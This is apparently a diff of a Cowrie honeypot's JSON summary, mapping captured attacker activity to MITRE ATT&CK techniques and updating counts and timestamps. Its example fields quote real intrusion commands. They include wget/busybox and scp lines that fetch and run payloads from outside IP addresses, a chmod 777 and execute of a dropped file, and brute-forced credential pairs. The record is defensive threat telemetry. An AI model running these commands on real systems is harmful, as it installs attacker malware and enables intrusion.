@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-13 21:05:09",
+  "generated": "2026-09-13 22:04:08",
   "totals": {
-    "commands": 10566,
-    "login_failed": 7192,
-    "login_success": 3430,
-    "sessions": 8023
+    "commands": 10910,
+    "login_failed": 7321,
+    "login_success": 3534,
+    "sessions": 8177
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 7192,
+      "count": 7321,
       "examples": [
         "support / 123123",
         "root / ASD@1",
@@ -21,14 +21,14 @@
         "admin / 120491"
       ],
       "first": "2026-09-13T00:01:39.551024Z",
-      "last": "2026-09-13T21:04:58.649498Z",
-      "unique_ips": 178
+      "last": "2026-09-13T22:02:48.453042Z",
+      "unique_ips": 184
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 3430,
+      "count": 3534,
       "examples": [
         "root / ",
         "ftpuser / ftpuser",
@@ -37,14 +37,14 @@
         "root / Test@2022"
       ],
       "first": "2026-09-13T00:06:04.494050Z",
-      "last": "2026-09-13T21:04:59.355303Z",
-      "unique_ips": 85
+      "last": "2026-09-13T22:01:55.189866Z",
+      "unique_ips": 89
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 100,
+      "count": 115,
       "examples": [
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -53,14 +53,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-09-13T01:09:07.830574Z",
-      "last": "2026-09-13T20:47:48.761424Z",
-      "unique_ips": 16
+      "last": "2026-09-13T21:45:02.656995Z",
+      "unique_ips": 17
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 38,
+      "count": 41,
       "examples": [
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -69,8 +69,8 @@
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $?"
       ],
       "first": "2026-09-13T01:07:47.596649Z",
-      "last": "2026-09-13T21:03:24.210649Z",
-      "unique_ips": 14
+      "last": "2026-09-13T21:45:02.656995Z",
+      "unique_ips": 15
     },
     {
       "id": "T1082",
@@ -92,15 +92,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 15,
+      "count": 16,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "id"
       ],
       "first": "2026-09-13T02:37:39.660670Z",
-      "last": "2026-09-13T20:47:48.295465Z",
-      "unique_ips": 15
+      "last": "2026-09-13T21:44:11.175878Z",
+      "unique_ips": 16
     },
     {
       "id": "T1083",
@@ -170,27 +170,27 @@
   "unmapped": [
     [
       "shell",
-      3356
+      3457
     ],
     [
       "sh",
-      3356
+      3457
     ],
     [
       "system",
-      3354
+      3455
     ],
     [
       "/bin/busybox UNSTABLE",
-      189
+      202
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      48
+      56
     ],
     [
       "enable",
-      13
+      14
     ],
     [
       "sh .k",
@@ -198,19 +198,19 @@
     ],
     [
       "linuxshell",
-      8
+      9
     ],
     [
       "ping ;sh",
-      7
+      8
     ],
     [
       "enablelinuxshell",
-      6
+      7
     ],
     [
       "cd /proc && cat self/cmdline",
-      6
+      7
     ],
     [
       "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
